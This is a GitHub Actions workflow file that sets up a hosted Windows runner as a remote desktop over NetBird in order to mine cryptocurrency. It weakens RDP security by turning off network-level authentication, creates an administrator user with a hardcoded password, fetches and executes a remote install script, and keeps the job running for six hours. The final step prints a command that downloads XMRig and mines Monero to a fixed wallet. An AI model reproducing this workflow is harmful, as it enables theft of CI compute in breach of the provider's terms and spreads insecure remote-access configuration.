name: RDP + NetBird (Full Desktop)
on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Configure RDP
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP-NetBird" | Out-Null
          netsh advfirewall firewall add rule name="RDP-NetBird" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP user
        run: |
          $password = "Runner-12345"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV

      # ---------- NetBird Installation (with fallbacks) ----------
      - name: Install NetBird (official script + fallback)
        run: |
          # Enable TLS 1.2
          [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
          
          # Try official install script first
          try {
            Write-Host "Attempting official install script..."
            Set-ExecutionPolicy Bypass -Scope Process -Force
            $script = (New-Object System.Net.WebClient).DownloadString('https://pkgs.netbird.io/windows/install.ps1')
            Invoke-Expression $script
            Write-Host "Official script succeeded."
          } catch {
            Write-Host "Official script failed: $_"
            
            # Fallback: direct download from GitHub releases (try multiple versions)
            $urls = @(
              "https://github.com/netbirdio/netbird/releases/download/v0.33.5/netbird_0.33.5_windows_amd64.msi",
              "https://github.com/netbirdio/netbird/releases/download/v0.32.0/netbird_0.32.0_windows_amd64.msi",
              "https://github.com/netbirdio/netbird/releases/download/v0.31.0/netbird_0.31.0_windows_amd64.msi",
              "https://github.com/netbirdio/netbird/releases/download/v0.30.3/netbird_0.30.3_windows_amd64.msi"
            )
            
            $installerPath = "$env:TEMP\netbird.msi"
            $downloaded = $false
            
            foreach ($url in $urls) {
              try {
                Write-Host "Trying $url ..."
                # Use curl.exe for better compatibility
                curl.exe -L -o $installerPath $url
                if (Test-Path $installerPath -and (Get-Item $installerPath).Length -gt 1MB) {
                  Write-Host "Downloaded successfully from $url"
                  $downloaded = $true
                  break
                } else {
                  Write-Host "Downloaded file too small or missing"
                }
              } catch {
                Write-Host "Failed: $_"
              }
            }
            
            if (-not $downloaded) {
              Write-Error "Could not download NetBird from any URL. Please check manually."
              exit 1
            }
            
            # Install the MSI
            Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
            Remove-Item $installerPath -Force
          }

      - name: Connect to NetBird
        env:
          NB_SETUP_KEY: ${{ secrets.NETBIRD_DEV_KEY }}
        run: |
          & "C:\Program Files\NetBird\netbird.exe" up --setup-key $env:NB_SETUP_KEY
          $nbIP = $null
          $retries = 0
          while (-not $nbIP -and $retries -lt 15) {
              $nbIP = (Get-NetIPAddress -InterfaceAlias "wt0" -ErrorAction SilentlyContinue).IPAddress
              Start-Sleep -Seconds 4
              $retries++
          }
          if (-not $nbIP) {
              Write-Error "NetBird IP not assigned. Exiting."
              exit 1
          }
          echo "NETBIRD_IP=$nbIP" >> $env:GITHUB_ENV

      - name: Display RDP Info and Miner Command
        run: |
          Write-Host "`n=== RDP ACCESS VIA NETBIRD ==="
          Write-Host "NetBird IP: $env:NETBIRD_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $env:RDP_PASSWORD"
          Write-Host "==================================`n"
          Write-Host "Once connected via RDP, open Command Prompt and paste the following command to start mining:"
          Write-Host ""
          Write-Host 'wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip -OutFile xmrig.zip && Expand-Archive xmrig.zip -DestinationPath . && cd xmrig-6.21.2 && xmrig.exe --url=pool.supportxmr.com:443 --user=49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP --pass=rdp_$(hostname) --tls --keepalive --cpu-max-threads-hint=80 --cpu-priority=5 --randomx-mode=fast --donate-level=1 --no-color'
          Write-Host ""
          Write-Host "The miner will run in that Command Prompt window. You can minimize it and it will keep mining."

      - name: Keep Alive
        run: while ($true) { Start-Sleep -Seconds 300 }
